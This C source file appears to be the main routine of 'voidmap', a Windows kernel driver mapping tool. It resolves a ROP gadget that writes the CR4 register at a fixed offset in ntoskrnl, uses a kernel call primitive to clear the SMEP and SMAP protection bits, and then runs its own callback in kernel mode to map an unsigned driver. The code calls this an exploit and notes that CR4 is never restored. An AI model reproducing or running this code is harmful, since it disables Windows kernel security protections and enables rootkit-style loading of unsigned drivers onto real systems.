#include "general.h"

int main(int argc, char* argv[])
{
    ConsoleTitle("voidmap");

    if (argc != 2)
    {
        ConsoleError("Invalid parameters; read README in official repo (github.com/SamuelTulach/voidmap)");
        return -1;
    }

    ConsoleInfo("Reading driver file...");
    const char* driverFilePath = argv[1];
    SIZE_T driverFileSize;
    driverBuffer = UtilsReadFile(driverFilePath, &driverFileSize);
    if (!driverBuffer)
    {
        ConsoleError("Failed to read driver file!");
        return -1;
    }

    PIMAGE_NT_HEADERS64 imageHeaders = UtilsGetImageHeaders(driverBuffer, driverFileSize);
    if (!imageHeaders)
    {
        ConsoleError("Invalid image file!");
        return -1;
    }

    ConsoleSuccess("Driver timestamp: %llu", imageHeaders->FileHeader.TimeDateStamp);

    ConsoleInfo("Getting kernel base...");
    PVOID kernelBase = UtilsGetModuleBase("ntoskrnl.exe");
    if (!kernelBase)
    {
        ConsoleError("Could not get kernel base address!");
        return -1;
    }

    ConsoleSuccess("Kernel base: 0x%p", kernelBase);

    ConsoleInfo("Loading kernel image locally...");
    HMODULE kernelHandle = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!kernelHandle)
    {
        ConsoleError("Failed to load kernel image locally!");
        return -1;
    }

    ConsoleSuccess("Local base: 0x%p", kernelHandle);

    ConsoleInfo("Resolving KeFlushCurrentTbImmediately...");
    DWORD64 gadget = (DWORD64)GetProcAddress(kernelHandle, "KeFlushCurrentTbImmediately");
    if (!gadget)
    {
        ConsoleError("Failed to load kernel image locally!");
        return -1;
    }

    ConsoleSuccess("KeFlushCurrentTbImmediately: 0x%p", gadget);

    ConsoleInfo("Resolving gadget address...");
    //
    // KeFlushCurrentTbImmediately + 0x17
    // mov     cr4, rcx
    // retn
    //
    gadget += 0x17;

    DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
    ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);

    ConsoleInfo("Setting thread priority...");
    BOOL status = SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    if (!status)
    {
        ConsoleError("Failed to set thread priority!");
        return -1;
    }

    ConsoleSuccess("Thread priority set");

    ConsoleInfo("Setting current process affinity...");
    DWORD_PTR originalAffinity = SetProcessAffinityMask(GetCurrentProcess(), 1 << 3);
    if (!originalAffinity)
    {
        ConsoleError("Failed to set thread affinity!");
        return -1;
    }

    ConsoleSuccess("Thread affinity set");

    ConsoleInfo("Zeroing out cr4 SMEP and SMAP protection bits...");
    status = CallerCallKernelFunction((PVOID)gadgetKernelAddress, 0x00000000000506F8);
    if (!status)
    {
        ConsoleError("Failed to call function!");
        return -1;
    }

    ConsoleInfo("Calling mapper itself...");
    status = CallerCallKernelFunction((PVOID)KernelCallback, 0);
    if (!status)
    {
        ConsoleError("Failed to call function!");
        return -1;
    }

    ConsoleInfo("Checking kernel callback...");
    if (!kernelCallbackCalled)
    {
        ConsoleError("Callback function was not called, exploit was unsuccessful!");
        return -1;
    }

    ConsoleSuccess("Callback called");

    ConsoleInfo("Waiting on driver map...");

    // TODO: restore CR4 somehow...
}